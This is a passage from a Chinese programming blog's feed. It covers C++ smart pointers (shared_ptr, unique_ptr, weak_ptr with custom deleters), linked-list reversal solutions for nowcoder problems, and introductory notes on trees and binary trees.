class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    <span class="hljs-comment">//操作智能指针</span><br>    <span class="hljs-comment">//删除器函数</span><br>    <span class="hljs-comment">//lambda</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr6</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">2</span>]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">3</span>&#125;,[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;this is deleting sharedPtr6&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr6:&quot;</span>&lt;&lt;*sharedPtr6.<span class="hljs-built_in">get</span>()&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*(sharedPtr6.<span class="hljs-built_in">get</span>()+<span class="hljs-number">1</span>)&lt;&lt;std::endl;<br>    <span class="hljs-comment">//c++自带的</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr7</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>&#125;,std::default_delete&lt;<span class="hljs-type">int</span>[]&gt;())</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        std::cout&lt;&lt;*(sharedPtr7.<span class="hljs-built_in">get</span>()+i)&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="unique-ptrc"><a href="#unique-ptrc" class="headerlink" title="unique_ptrc"></a>unique_ptrc</h2><h3 id="操作实例-1"><a href="#操作实例-1" class="headerlink" title="操作实例"></a>操作实例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//一，初始化</span><br>    <span class="hljs-comment">//1.1 使用构造函数</span><br>    <span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span> &gt; <span class="hljs-title">uniquePtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">25</span>&#125;)</span></span>;<br>    std::cout&lt;&lt;*uniquePtr&lt;&lt;std::endl;<br>    *uniquePtr.<span class="hljs-built_in">get</span>()=<span class="hljs-number">100</span>;<br>    std::cout&lt;&lt;*uniquePtr&lt;&lt;std::endl;<br>    std::cout&lt;&lt;uniquePtr.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    <span class="hljs-comment">//1.2 使用移动构造</span><br>    std::unique_ptr&lt;<span class="hljs-type">int</span>&gt; uniquePtr1= std::<span class="hljs-built_in">move</span>(uniquePtr);<br>    std::cout&lt;&lt;*uniquePtr1&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//1.3 使用reset</span><br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr1.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr1.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span> &#123;<span class="hljs-number">959</span>&#125;);<br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>&#125;);<br>    std::cout&lt;&lt;uniquePtr.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br><br>    <span class="hljs-comment">//unique_ptr 删除器</span><br>    <span class="hljs-comment">//函数指针实例  lambda在没有捕获的时候，可以看成函数指针</span><br>    <span class="hljs-comment">/*using funcPtr=void(*)(int*);*/</span><br>    <span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span>[],<span class="hljs-title">void</span><span class="hljs-params">(*)</span><span class="hljs-params">(<span class="hljs-type">int</span>*)</span>&gt; <span class="hljs-title">uniquePtr2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;,[](<span class="hljs-type">int</span> * pInt)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;delete uniquePtr2&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    uniquePtr2[<span class="hljs-number">0</span>]=<span class="hljs-number">244</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[0]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">0</span>]&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[1]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">1</span>]&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//仿函数实例 lambda在有捕获的时候，只能看成函数仿函数</span><br>    std::unique_ptr&lt;<span class="hljs-type">int</span>,std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>*)&gt;&gt; <span class="hljs-built_in">uniquePtr3</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">244</span>&#125;,[&amp;uniquePtr2](<span class="hljs-type">int</span>* pInt)&#123;<br>        uniquePtr2[<span class="hljs-number">1</span>]=<span class="hljs-number">6</span>;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;delete uniquePtr3&quot;</span>&lt;&lt;std::endl;<br>        <span class="hljs-keyword">delete</span> pInt;<br>    &#125;);<br>    uniquePtr3.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[1]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">1</span>]&lt;&lt;std::endl;<br><br><br>    <span class="hljs-comment">//std::unique_ptr 类型可以对数组指针自动管理 不需要想shared的那样的指定删除器函数</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h2><ol><li><p>初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//weak_ptr的初始化</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">233</span>&#125;)</span></span>;<br>    <span class="hljs-comment">//无参构造</span><br>    std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; weakPtr;<br>    <span class="hljs-comment">//拷贝构造</span><br>    <span class="hljs-function">std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weakPtr1</span><span class="hljs-params">(weakPtr)</span></span>;<br>    <span class="hljs-comment">//通过shared_ptr</span><br>    <span class="hljs-function">std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weakPtr2</span><span class="hljs-params">(sharedPtr)</span></span>;<br>    <span class="hljs-comment">//使用=</span><br>     std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; weakPtr3;<br>     weakPtr3=weakPtr2;<br>     std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr3.use_count:&quot;</span>&lt;&lt;weakPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>     <br>     <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>expired</code> 判断所指的对象是否析构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">244</span>&#125;)</span></span>;<br>    std::weak_ptr&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">weakPtr</span>(sharedPtr);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.use_count():&quot;</span>&lt;&lt;weakPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.expired():&quot;</span>&lt;&lt;(weakPtr.<span class="hljs-built_in">expired</span>()?<span class="hljs-string">&quot;is&quot;</span>:<span class="hljs-string">&quot;not&quot;</span>)&lt;&lt; std::endl;<br><br>    sharedPtr.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.use_count():&quot;</span>&lt;&lt;weakPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.expired():&quot;</span>&lt;&lt;(weakPtr.<span class="hljs-built_in">expired</span>()?<span class="hljs-string">&quot;is&quot;</span>:<span class="hljs-string">&quot;not&quot;</span>)&lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><p>不能使用同一个堆内存初始化智能指针</p><p>![image-20230319185006853](C:\Users\12414\OneDrive - cuit.edu.cn\桌面\智能指针.assets\image-20230319185006853.png)</p><p>但是可以使用”&#x3D;” 进行赋值操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Test* test=<span class="hljs-keyword">new</span> Test;<br>std::shared_ptr&lt;Test&gt;<span class="hljs-built_in">sharedPtr</span>(test);<br>std::shared_ptr sharedPtr1=sharedPtr;<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>std::shared_ptr&lt;Test&gt; sharedPtr2= std::<span class="hljs-built_in">move</span>(sharedPtr);<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2.use_count():&quot;</span>&lt;&lt;sharedPtr2.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>std::shared_ptr&lt;Test&gt; sharedPtr3=sharedPtr;<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr3.use_count():&quot;</span>&lt;&lt;sharedPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><span class="hljs-comment">//此时sharedPtr已经move,所以结果为0</span><br></code></pre></td></tr></table></figure></li><li><p>对智能指针使用’.’操作的智能指针的api,如果使用’-&gt;’操作的是，对应的类的成员方法</p></li><li><p>正确的返回<code>this</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Test</span>:<span class="hljs-keyword">public</span> std::enable_shared_from_this&lt;Test&gt;&#123;<br>    <span class="hljs-built_in">Test</span>()&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;Test()&quot;</span>&lt;&lt;std::endl;<br>    &#125;<br>    ~<span class="hljs-built_in">Test</span>()&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;~Test()&quot;</span>&lt;&lt;std::endl;<br>    &#125;<br>    <span class="hljs-function">std::shared_ptr&lt;Test&gt; <span class="hljs-title">getSharedPtr</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-built_in">shared_from_this</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">std::shared_ptr&lt;Test&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Test)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    std::shared_ptr&lt;Test&gt; sharedPtr1=sharedPtr-&gt;<span class="hljs-built_in">getSharedPtr</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr1.use_count():&quot;</span>&lt;&lt;sharedPtr1.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>共享智能指针不能循环引用</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反转整个链表</title>
    <link href="/2023/04/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="!%5Bimage-20230410224210507%5D(C:%5CUsers%5C12414%5CDesktop%5Chexo%5Csource_posts%5C%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8.assets%5Cimage-20230410224210507.png)">题</a></p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">ReverseList</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* pHead )</span> &#123;<br>    <span class="hljs-comment">// write code here</span><br>    <span class="hljs-keyword">if</span>(pHead==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>pHead;<br>    <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">temp</span>=</span>cur-&gt;next;<br>        cur-&gt;next=pre;<br>        pre=cur;<br>        cur=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pre;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>理解</p><ul><li>让<code>temp</code>保存<code>cur-&gt;next</code>的地址</li><li><code>pre</code>第一次要为NULL</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表内指定区域反转</title>
    <link href="/2023/04/10/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E5%86%85%E6%8C%87%E5%AE%9A%E5%8C%BA%E5%9F%9F%E5%8F%8D%E8%BD%AC/"/>
    <url>/2023/04/10/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E5%86%85%E6%8C%87%E5%AE%9A%E5%8C%BA%E5%9F%9F%E5%8F%8D%E8%BD%AC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/b58434e200a648c589ca2063f1faf58c?tpId=295&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/oj?page=1&tab=%E7%AE%97%E6%B3%95%E7%AF%87&topicId=295">链表内指定区间反转_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%83%A8%E5%88%86%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstddef&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param m int整型</span><br><span class="hljs-comment">     * @param n int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseBetween</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>         ListNode* temHead=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//c++的创建方法，0是data域</span><br>        <span class="hljs-comment">//创建虚拟头节点</span><br>        <span class="hljs-comment">//操作头节点方便，比如如果反转第一个元素</span><br>         temHead-&gt;next=head;<br>        <br>        <br>         ListNode* pre=temHead;<br>         ListNode* cur=head;<br>        <span class="hljs-comment">//两个指针用于操作来链表</span><br>        <br>         ListNode* tem=<span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-comment">//用于存放cur-&gt;next</span><br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; ++i) &#123;<br>            pre=pre-&gt;next;<br>            cur=cur-&gt;next;<br>        &#125;<br>        <span class="hljs-comment">//使节点移动</span><br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n-m;++i) &#123;<br>            tem=cur-&gt;next;<br>            cur-&gt;next=tem-&gt;next;<br>            <span class="hljs-comment">//始终让cur-&gt;next指向的使next-&gt;xext;</span><br>            <br>            <br>            tem-&gt;next=pre-&gt;next;<br>            <span class="hljs-comment">//让反转的指针，指向pre-&gt;next实现反转</span><br>            <br>            pre-&gt;next=tem;<br>            <span class="hljs-comment">//再让pre指向tem保持连接</span><br>            <br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> temHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%83%A8%E5%88%86%E9%93%BE%E8%A1%A8%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>先遍历到反转区域</li><li>使用虚拟头节点</li></ul></li><li><p>问题</p><ul><li><p>为什么不用判断<code>cur-&gt;next-&gt;next</code>是不是越界？</p><blockquote><p>因为不会越界</p><p>如果使用的区域刚好是整个链表</p><p>那么当要反转最后一个节点的时候，也就是最后一次</p><p>cur-&gt;next-&gt;next&#x3D;<code>nullptr</code></p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树和二叉树</title>
    <link href="/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="树和二叉树"><a href="#树和二叉树" class="headerlink" title="树和二叉树"></a>树和二叉树</h1><h2 id="树的基本"><a href="#树的基本" class="headerlink" title="树的基本"></a>树的基本</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><ol><li><p>一个根和若干的子树</p></li><li><p>基本术语</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p></li><li><p>树的类别</p><ul><li><p>有序树</p><p>子树有位置要求</p></li><li><p>无序树</p><p>子树无要求</p><p>意思是：1，2，3，这三颗子树，无论如何排列都是一个树</p></li></ul></li><li><p>森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97.png"></p></li><li><p>树和线性结构的比较</p><ul><li>树是一对多</li><li>线性结构是一对一</li></ul></li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>每个节点最多有两个度</p></li><li><p>二叉树是个有序树（但是不是树的特殊情况）</p></li><li><p>二叉树可以是一 个空集 </p></li><li><p>二叉树必须要分左子树还是右子树，即使只有一颗子树也要分（但是树可以不分，所以这就是二叉树不是树的原因）</p></li><li><p>二叉树的基本形态</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%BD%A2%E6%80%81.png"></p></li><li><p>二叉树的抽象类型定义</p></li><li><p>二叉树的性质</p><ul><li><p>在二叉树的第<code>i</code>层最多有2^i-1^ 个节点，最少有一个</p></li><li><p>深度为<code>k</code>的二叉树最多有2^k^ -1个节点</p></li><li><p>对任何一颗二叉树T如果叶子树为n<del>0</del>&#x3D;n<del>2</del>+1</p></li></ul><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A83.png"></p><ul><li><p>B&#x3D;n-1</p><p>从下网上看，因为除了根节点每个节点都会产生一条边，所以<code>n-1</code>（除了根节点）个节点会产生<code>n-1</code>个边</p></li><li><p>n<del>2</del> *2 +n<del>1</del>*1</p><p>从上往下看，因为，每一个度为2的节点都会产生两条边，每一度为1的节点会产生一个边</p></li><li><p>满二叉树</p><ul><li>每一层都达到最大的节点数</li><li>叶子节点出现在最后一层</li></ul></li><li><p>完成二叉树</p><ul><li><p>二叉树中有编号的与满二叉树的标号对应</p></li><li><p>在满二叉树中去除立连续的节点，剩下的也是完全二叉树</p></li><li><p>满二叉树一定是完全二叉树</p></li><li><p>完全二叉树的性质</p><p>性质三</p><p><img 